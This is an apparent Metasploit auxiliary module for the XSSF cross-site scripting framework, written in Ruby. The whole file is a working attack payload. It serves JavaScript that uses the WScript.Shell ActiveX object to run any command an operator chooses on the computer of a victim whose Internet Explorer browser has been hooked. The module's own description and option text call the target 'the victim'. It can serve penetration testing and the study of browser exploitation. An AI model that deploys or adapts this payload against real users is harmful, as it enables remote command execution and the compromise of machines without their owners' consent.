require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'COMMAND XSSF (IE Only)',
			'Description' => 'This module runs a given command into the computer of the victim'
		))
		
		register_options(
			[
				OptString.new('Command', [true, 'Command you want to send to the victim [calc.exe, cmd.exe, ...].'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{ 
				var shell = new ActiveXObject("WScript.Shell"); 
				shell.run("#{datastore['Command']}");
		}
		
		send_response(cli, code, {'Content-Type' => 'text/html'} )
	end
end